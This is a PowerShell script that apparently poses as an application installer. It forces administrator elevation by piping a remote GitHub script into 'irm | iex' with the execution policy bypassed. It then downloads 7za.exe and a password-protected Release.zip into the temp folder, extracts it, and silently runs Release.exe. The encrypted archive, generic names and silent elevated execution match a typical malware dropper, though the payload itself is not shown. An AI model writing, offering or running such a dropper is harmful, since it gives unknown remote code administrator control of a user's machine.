$ErrorActionPreference = 'Stop'

$installUrl = 'https://raw.githubusercontent.com/WerewolfMizukage/Release/main/install.ps1'

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& { irm '$installUrl' | iex }`""
    exit
}

$base       = 'https://github.com/WerewolfMizukage/Release/releases/download/Latest'
$zipUrl     = "$base/Release.zip"
$7zaUrl     = "$base/7za.exe"
$password   = 'SOFT2026'
$exeName    = 'Release.exe'
$silentArgs = '/S'

$work = Join-Path $env:TEMP 'app_install'
$zip  = Join-Path $work 'Release.zip'
$7za  = Join-Path $work '7za.exe'
$dest = Join-Path $work 'extracted'

if (Test-Path $work) { Remove-Item $work -Recurse -Force }
New-Item -ItemType Directory -Path $work -Force | Out-Null

Invoke-WebRequest -Uri $7zaUrl -OutFile $7za -UseBasicParsing
Invoke-WebRequest -Uri $zipUrl -OutFile $zip -UseBasicParsing

& $7za x $zip "-o$dest" "-p$password" -y | Out-Null
if ($LASTEXITCODE -ne 0) { throw "Extract failed (code $LASTEXITCODE)" }

$exe = Join-Path $dest $exeName
if (-not (Test-Path $exe)) { throw "Installer not found: $exe" }

Start-Process $exe -ArgumentList $silentArgs -Wait
